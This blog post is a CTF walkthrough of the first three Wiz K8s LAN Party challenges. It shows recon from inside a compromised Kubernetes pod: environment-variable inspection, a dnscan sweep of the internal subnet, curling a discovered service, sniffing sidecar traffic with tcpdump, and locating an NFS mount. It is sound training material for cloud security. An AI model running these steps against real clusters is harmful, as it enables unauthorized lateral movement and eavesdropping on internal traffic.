---
author: "chxmxii_"
date: "2023-08-21"
tags:
  - Kubernetes
  - CTF
type:
  - post
  - posts
title: "K8SLANPARTY - CHALLENGES"
weight: 10
series:
  - "Hugo 101"
---
![](/files/k8slan.png#center)

---
# CHALLENGE 1;
  ## Challenge Description: DNSing with the Stars

  + You've gained shell access to a compromised Kubernetes pod and your next objective is to further compromise internal services. As a warm-up, utilize DNS scanning to uncover hidden internal services and obtain the flag. We've provided `dnscan` to facilitate this process for upcoming challenges.

  + All flags in this challenge follow the format: `wiz_k8s_lan_party{*}`

  ### Solution;

+ Given the task at hand, my initial approach was to inspect the environment variables, a tactic that proved fruitful.

  ```shell 
  player@wiz-k8s-lan-party:~$ printenv | grep kubernetes -i
  KUBERNETES_SERVICE_PORT_HTTPS=443
  KUBERNETES_SERVICE_PORT=443
  KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
  KUBERNETES_PORT_443_TCP_PROTO=tcp
  KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1
  KUBERNETES_SERVICE_HOST=10.100.0.1
  KUBERNETES_PORT=tcp://10.100.0.1:443
  KUBERNETES_PORT_443_TCP_PORT=443

  player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16 > file

  player@wiz-k8s-lan-party:~$ cat file
  10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.
  10.100.136.254 -> getflag-service.k8s-lan-party.svc.cluster.local

  player@wiz-k8s-lan-party:~$ curl 10.100.136.254
  wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northern-star}
  ```
---
# CHALLENGE 2;
  ## Challenge Description: HELLO?

  + Sometimes, it feels like we're alone, but we must stay vigilant against hidden sidecars leaking sensitive information.

### Solution

+ As mentioned earlier, we were alerted about the possibility of sidecar containers. My first action was to rerun the `dnscan` command, leading me to discover the `reporting-service.k8s-lan-party.svc.cluster.local` service. This container seemed to be communicating with `istio-envoy`, a component of a service mesh. I then tried to listen to the traffic between the containers using `tcpdump -A`.

  ```shell
  player@wiz-k8s-lan-party:~$ curl -kv reporting-service.k8s-lan-party.svc.cluster.local
  *   Trying 10.100.171.123:80...
  * Connected to reporting-service.k8s-lan-party.svc.cluster.local (10.100.171.123) port 80 (#0)
  > GET / HTTP/1.1
  > Host: reporting-service.k8s-lan-party.svc.cluster.local
  > User-Agent: curl/7.81.0
  > Accept: */*
  > 
  * Mark bundle as not supporting multiuse
  < HTTP/1.1 200 OK
  < server: istio-envoy
  < date: Tue, 26 Mar 2024 10:28:01 GMT
  < content-type: text/plain
  < x-envoy-upstream-service-time: 1
  < x-envoy-decorator-operation: :0/*
  < transfer-encoding: chunked
  < 
  * Connection #0 to host reporting-service.k8s-lan-party.svc.cluster.local left intact

  player@wiz-k8s-lan-party:~$ tcpdump -A | grep wiz
  tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
  listening on ns-892853, link-type EN10MB (Ethernet), snapshot length 262144 bytes
  wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}
  ```
---
# CHALLENGE 3;
  ## Challenge Description: Exposed File Share

  + The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based 🤦‍️.

### Solution;

"access control was only network-based" is a big hint that we are talking about nfs here. lets check the df -hT command to see mounts in our system

```shell
player@wiz-k8s-lan-party:~$ df -hT
Filesystem                                         Type     Size  Used Avail Use% Mounted on
overlay                                            overlay  300G   23G  278G   8% /
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ nfs4     8.0E     0  8.0E   0% /efs
tmpfs                                              tmpfs     60G   12K   60G   1% /var/run/secrets/kubernetes.io/serviceaccount
tmpfs                                              tmpfs     64M     0   64M   0% /dev/null
```dfdf

we can we have a fs system from this endpoint mounted on /efs, though i found the flag, but the challenge doesn't end here as we don't have the permission to read that file

